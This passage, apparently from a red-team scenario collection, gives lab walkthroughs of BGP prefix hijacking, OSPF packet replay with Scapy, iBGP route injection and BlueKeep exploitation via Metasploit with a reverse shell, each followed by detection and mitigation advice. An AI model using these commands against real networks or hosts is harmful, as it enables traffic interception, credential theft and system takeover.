- **Tags**: #BGPReset #RouteFlap #TCPDoS #RoutingAttack #NetworkInstability #BGPDoS #RedTeamInfra #ScapyBGP

## Man-in-the-Middle via BGP Manipulation

- **Attack Type**: Routing Protocol Exploitation / MITM
- **Target**: ISP Border Routers<brCloud Peering Routers<brInternet Exchange Participants
- **Vulnerability**: - No BGP RPKI/ROA- Lack of strict prefix filtering- Acceptance of paths with suspicious origins
- **MITRE**: T1565.001 – Network Traffic ManipulationT1583.004 – Network Infrastructure Hijack
- **Impact**: - Traffic interception- Credential harvesting- DNS spoofing- Downtime / degraded services- Legal/regulatory consequences
- **Tools**: ✅ GNS3 or EVE-NG (BGP Lab Simulation)✅ BGP-capable routers (Cisco/Quagga/FRRouting)✅ Attacker ASN setup (AS666)✅ Scapy or Wireshark for packet capture✅ Web server / DNS server (optional victim service)✅ Route monitoring tools (BGPMon, RIPE RIS)
- **Scenario**: This simulation shows how an attacker with access to a malicious BGP router (rogue ASN) can exploit the lack of route validation in BGP to reroute internet traffic through its own network, effectively performing a Man-in-the-Middle (MITM). By announcing IP prefixes belonging to a legitimate AS and advertising them with shorter or more specific paths, the attacker convinces upstream routers to send traffic through the rogue ASN. The attacker can then inspect, manipulate, or drop this traffic. This method has been used in real-world surveillance operations and cryptocurrency heists.
- **Attack Steps**: ### 🟢 STEP 1: Lab SetupSimulate 3 routers:• R1 (ISP – AS65001)• R2 (Legitimate Host – AS65002 – Owns 203.0.113.0/24)• R3 (Attacker – AS666)✅ Connect all routers via a virtual switch or internet cloud in GNS3/EVE-NG---### 🟢 STEP 2: Configure Legitimate BGPOn R2 (Victim):router bgp 65002network 203.0.113.0 mask 255.255.255.0neighbor 192.168.1.1 remote-as 65001✅ This advertises the legitimate prefix to ISP (R1)---### 🟢 STEP 3: Configure Attacker BGPOn R3 (AS666):router bgp 666network 203.0.113.0 mask 255.255.255.0neighbor 192.168.1.1 remote-as 65001🧠 You are now falsely claiming the victim’s IP block✅ ISP (R1) now sees two routes to same prefix---### 🟢 STEP 4: Win Route Selection via Path ManipulationOn R3, make your path appear more attractive:• Set lower AS path count (e.g., just “666”)• Advertise a more specific prefix: 203.0.113.0/25 and 203.0.113.128/25✅ These will be preferred due to specificity and shorter path---### 🟢 STEP 5: Confirm MITM SetupOn R1:show ip bgp✅ Traffic for 203.0.113.0/24 is now routed to attacker AS666From client (real or simulated):curl http://203.0.113.10✅ Request goes through R3On R3 (attacker):tcpdump -i eth0 host 203.0.113.10✅ Capture victim traffic🧠 Optional: Proxy or NAT traffic to real destination so victim never notices• Use iptables:iptables -t nat -A PREROUTING -d 203.0.113.10 -j DNAT --to-destination 203.0.113.10---### 🟢 STEP 6: Perform MITM Operations• Intercept passwords from HTTP• Spoof DNS responses• Modify data in transit• Drop or delay packets✅ Full control over victim data flows---### 🛑 STEP 7: Cleanup• Withdraw fake BGP announcements:no network 203.0.113.0 mask 255.255.255.0• Clear sessions:clear ip bgp *🧠 Global convergence will restore original routes within minutes
- **Detection**: - Use BGPMon / RIPEstat to detect prefix origin anomalies- Monitor for unexpected AS_PATH or sub-prefixes- Alert on high BGP route churn
- **Solution**: - Enforce strict prefix filters for peers- Deploy RPKI validation (RFC 6811)- Monitor for hijacks using global BGP monitoring tools- Implement BGP session logging and alerts
- **Tags**: #BGPMITM #PrefixHijack #RoutePoisoning #NetworkSurveillance #RoutingAbuse #BGPRedTeam #InternetRouting

## Replay / Reflect OSPF Packets

- **Attack Type**: Routing Protocol Injection / Packet Replay
- **Target**: Internal OSPF-enabled Routers<brCampus VLAN Routers<brCloud-based dynamic routers
- **Vulnerability**: - Null or weak OSPF authentication- No sequence number validation- No encryption or replay protection
- **MITRE**: T1557.002 – Adversary-in-the-Middle via Routing<brT1565.001 – Network Traffic Manipulation
- **Impact**: - Routing table corruption- Routing loops- Adjacency flapping- Denial of service- Man-in-the-middle insertion
- **Tools**: ✅ Kali Linux or Ubuntu (Attacker)✅ Wireshark (to sniff OSPF traffic)✅ Scapy (for packet crafting and replay)✅ GNS3 or EVE-NG for router simulation✅ FRRouting or Cisco IOS routers✅ Access to same broadcast domain as OSPF speakers
- **Scenario**: This simulation shows how an attacker inside the same subnet as an OSPF-enabled router can capture, replay, or reflect OSPF Hello and LSA packets to trick routers into forming bogus adjacencies, cause routing loops, or inject stale/invalid route data into the OSPF database. If OSPF is configured with null or simple password authentication, it is especially vulnerable. The attacker uses tools like Scapy or Wireshark to replay previously captured OSPF packets and confuse the router’s state machine, leading to DoS, MITM, or hijacked routes.
- **Attack Steps**: ### 🟢 STEP 1: Lab SetupUse GNS3 or EVE-NG to simulate:• R1 and R2 (legit OSPF routers, Area 0)• R3 (attacker host with Kali Linux)All interfaces are in the same Layer 2 subnetOn R1 and R2:router ospf 1network 192.168.1.0 0.0.0.255 area 0✅ Ensure R1 and R2 have formed OSPF adjacency---### 🟢 STEP 2: Capture Legitimate OSPF PacketsOn Kali (R3):sudo wireshark or tcpdump -i eth0 proto ospf✅ Capture OSPF Hello, DBD, LSA, and LSU packetsSave the .pcap file for replay---### 🟢 STEP 3: Analyze Packet FieldsInspect packets in Wireshark:• Note Router ID, Area ID, Auth Type, and Sequence Number• Look for Type 1 Router LSA and Type 2 Network LSA🧠 Important: No encryption = replay is possible---### 🟢 STEP 4: Craft and Replay OSPF PacketOn Kali, create a Scapy replay script:python<br>from scapy.all import *<br>from scapy.contrib.ospf import *<br><br>pkt = rdpcap("ospf_hello.pcap")[0]<br>sendp(pkt, iface="eth0", loop=1, inter=1)<br>✅ Replays OSPF Hello packet every secondOr craft new one manually:python<br>ospf_hello = IP(dst="224.0.0.5")/OSPF_Hdr(router="192.168.1.10")/OSPF_Hello() <br>send(ospf_hello, iface="eth0")<br>---### 🟢 STEP 5: Trick Router into Forming False Adjacency• Replay Hello packets from spoofed Router ID• R1/R2 may believe there's a neighbor with same Router ID• State machine enters INIT or 2-WAY falsely✅ Causes confusion in DR/BDR election, routing table corruption---### 🟢 STEP 6: Replay Stale or Malicious LSAFrom .pcap file, isolate LSA update:python<br>lsa = rdpcap("lsa_update.pcap")[0]<br>sendp(lsa, iface="eth0")<br>✅ Injects expired, false, or conflicting topology data🧠 Router accepts LSA if seq number and checksum look valid---### 🟢 STEP 7: Impact Analysis• Run show ip ospf database on R1/R2• Check for unexpected entries or unknown neighbors• Ping between endpoints may now fail (routing loops or blackhole)✅ You’ve successfully replayed OSPF packets to alter router state---### 🛑 STEP 8: Cleanup• Stop packet replay• On routers: clear ip ospf process• Reboot OSPF interfaces• Use ACLs to block attacker interface🧠 Optional: Enable MD5 auth to prevent further spoofing
- **Detection**: - Monitor for duplicate OSPF Router IDs<br- Analyze show ip ospf neighbor for suspicious states- Use Wireshark to detect LSA replay or duplicate Hello packets
- **Solution**: - Enable OSPF MD5 or SHA authentication- Use OSPF TTL Security Check (RFC 5082)- Filter OSPF traffic using ACLs- Restrict OSPF on trusted interfaces only
- **Tags**: #OSPFReplay #RoutingAttack #LSAForgery #OSPFExploit #NetworkInjection #RedTeamRouting #ScapyOSPF #WiresharkReplay

## BGP Backdoor Route Injection (Inside ISP)

- **Attack Type**: BGP Route Injection / Lateral Traffic Hijacking
- **Target**: ISP Internal Routers<brCore/Edge Devices<brEnterprise BGP Backbone
- **Vulnerability**: - Lack of prefix filters in iBGP<br- No RPKI validation<br- No BGP session audit/logging<br- Trust between internal peers
- **MITRE**: T1565.001 – Network Traffic Manipulation<brT1583.004 – Network Infrastructure Hijack
- **Impact**: - Traffic rerouted via attacker<br- Potential MITM or sniffing<br- Credential exposure<br- Blackholing or data loss
- **Tools**: ✅ GNS3 / EVE-NG for lab✅ BGP-capable routers (Cisco IOS / FRRouting / Quagga)✅ Kali Linux (optional attacker payload capture)✅ Internal network access to ISP’s iBGP segment✅ Wireshark for iBGP sniffing✅ BGP monitoring tools like ExaBGP or BGPStream
- **Scenario**: This simulation shows how an attacker who has access inside an ISP network (via compromise, malicious insider, or collusion) can inject a BGP route from a backdoor router, misleading internal BGP (iBGP) peers to send traffic to unauthorized systems. This attack is dangerous because internal BGP sessions trust each other, and a rogue router advertising valid-looking prefixes (e.g., a customer or partner’s network) can intercept or redirect traffic without needing global visibility. The attacker may use this to create MITM tunnels, perform traffic blackholing, or launch advanced persistence threats within the ISP’s infrastructure.
- **Attack Steps**: ### 🟢 STEP 1: Lab Topology SetupSimulate 3 routers:• R1 – Legitimate ISP Core Router (AS65001)• R2 – Customer Gateway (AS65002)• R3 – Rogue/Backdoor Router (also inside AS65001)All routers must be in iBGP relationship (AS65001)Connections:• R1 ↔ R2 (eBGP)• R1 ↔ R3 (iBGP)✅ Ensure R1 and R3 are fully meshed iBGP neighbors---### 🟢 STEP 2: Configure Legitimate BGP PeeringOn R1:router bgp 65001neighbor 192.168.1.3 remote-as 65001neighbor 192.168.1.2 remote-as 65002On R2:router bgp 65002neighbor 192.168.1.1 remote-as 65001network 203.0.113.0 mask 255.255.255.0✅ R2 announces 203.0.113.0/24 to ISP---### 🟢 STEP 3: Simulate Rogue Router InjectionOn R3:router bgp 65001neighbor 192.168.1.1 remote-as 65001network 203.0.113.0 mask 255.255.255.0✅ R3 now advertises the same prefix as R2🧠 Since both are internal BGP peers, R1 must choose best path---### 🟢 STEP 4: Win Best Path SelectionManipulate R3’s route to win:• Set lower LOCAL_PREF value:neighbor 192.168.1.1 route-map PREFER_ME inroute-map PREFER_ME permit 10set local-preference 200• Optionally advertise more specific prefixes:network 203.0.113.0 mask 255.255.255.128network 203.0.113.128 mask 255.255.255.128✅ R1 will now prefer path via rogue router (R3)---### 🟢 STEP 5: Intercept / Analyze Routed TrafficOn R3, enable IP forwarding and packet capture:echo 1 > /proc/sys/net/ipv4/ip_forwardtcpdump -i eth0 net 203.0.113.0/24🧠 You’re now in the path between R1 and R2, silently observing dataOptional: Use Bettercap or MITMproxy to modify data in transit---### 🟢 STEP 6: Confirm Attack ImpactOn R2:traceroute 8.8.8.8✅ Path passes through rogue R3• Latency changes• Connection logs show R3 as intermediaryOn R1:show ip bgp 203.0.113.0✅ Path now prefers iBGP peer R3---### 🛑 STEP 7: Cleanup• On R3, remove injected routes:no network 203.0.113.0 mask 255.255.255.0• Clear BGP sessions:clear ip bgp *• Restore routing preferences on R1🧠 Alert admins and isolate rogue router in real-world cases
- **Detection**: - Monitor BGP tables for same-prefix announcements<br- Analyze LOCAL_PREF and next-hop fields<br- Use BGP telemetry (BGPmon, BGPStream, ExaBGP)
- **Solution**: - Enforce strict iBGP prefix filters<br- Deploy RPKI origin validation<br- Enable iBGP session authentication (MD5/TCP-AO)<br- Log and audit all internal route injections
- **Tags**: #BGPBackdoor #iBGPInjection #NetworkHijack #ISPCompromise #RedTeamRouting #PrefixManipulation

## BlueKeep (CVE-2019-0708)

- **Attack Type**: Remote Code Execution via RDP Vulnerability
- **Target**: Windows 7<brWindows Server 2008<brWindows XP
- **Vulnerability**: - RDP protocol buffer overflow<br- No authentication required<br- No user interaction needed
- **MITRE**: T1210 – Exploitation of Remote Services<brT1203 – Exploitation for Client Execution
- **Impact**: - Full remote code execution (SYSTEM privilege)- Potential worm propagation- Credential theft, data exfiltration- Initial foothold into internal network
- **Tools**: ✅ Windows 7 SP1 (Unpatched)✅ Kali Linux (Attacker)✅ Metasploit Framework✅ rdpscan for vulnerability testing✅ Nessus or Nmap for version detection✅ Optional: Custom BlueKeep PoC scripts✅ Isolated virtual lab environment (VirtualBox/VMware)
- **Scenario**: BlueKeep is a critical Remote Code Execution (RCE) vulnerability in Microsoft’s Remote Desktop Protocol (RDP) service, discovered in 2019. It affects older Windows versions like Windows 7, Server 2008, and XP, allowing an unauthenticated attacker to execute code remotely by sending crafted RDP packets before authentication. This can lead to wormable attacks, allowing malware to spread automatically from system to system (like WannaCry). In this simulation, we recreate the vulnerability in a safe lab and demonstrate how attackers could exploit it using Metasploit or custom scripts. BlueKeep is dangerous even without user interaction.
- **Attack Steps**: ### 🟢 STEP 1: Setup Vulnerable Target• Install Windows 7 SP1 in a virtual machine (VM)• Do not apply May 2019 patches or later• Enable RDP: Control Panel → System → Remote Settings → Allow connections• Confirm RDP port is open (default: 3389)---### 🟢 STEP 2: Confirm VulnerabilityOn Kali (attacker):git clone https://github.com/robertdavidgraham/rdpscancd rdpscan && make./rdpscan <target-ip>✅ Output should say “VULNERABLE” if system is affectedOptional: Use Nmap NSE:nmap -p 3389 --script rdp-vuln-ms12-020 <target-ip>🧠 Note: BlueKeep is pre-auth, so no login needed---### 🟢 STEP 3: Launch Exploit using MetasploitStart Metasploit:msfconsoleSearch for exploit:search bluekeepSelect module:use exploit/windows/rdp/cve_2019_0708_bluekeep_rceSet target:set RHOSTS <target-ip>set RPORT 3389set PAYLOAD windows/x64/meterpreter/reverse_tcpset LHOST <your-Kali-IP>set LPORT 4444Run the exploit:run✅ If successful, a reverse Meterpreter shell opensType:sysinfo — Shows Windows infoshell — Drops to command prompt---### 🟢 STEP 4: Optional - Custom Scripted ExploitIf using modified PoC:python bluekeep_poc.py --target <ip> --payload meterpreter.bin🧠 Ensure DEP/ASLR is disabled for custom payloads---### 🟢 STEP 5: Post-Exploitation Actions• Extract password hashes: hashdump• Enable RDP persistence• Deploy keylogger or ransomware• Laterally move using SMB or RDP to other systems✅ You now have full SYSTEM-level access without a password---### 🛑 STEP 6: Cleanup• Kill Meterpreter session: exit• Shut down and revert VM snapshot• Restore firewall settings on target if changed• Patch target OS to prevent future exploitation
- **Detection**: - Check RDP logs for abnormal session attempts<br- Analyze network for malformed RDP packets<br- Use IDS/IPS rules for CVE-2019-0708 signatures
- **Solution**: - Apply Microsoft patch KB4499175<br- Disable RDP if unused<br- Enable NLA (Network Level Authentication)<br- Use RDP Gateway with 2FA<br- Segment and restrict internal RDP access
- **Tags**: #BlueKeep #RDPExploit #CVE20190708 #RemoteCodeExecution #WindowsExploit #Metasploit #RedTeam #WormableRCE
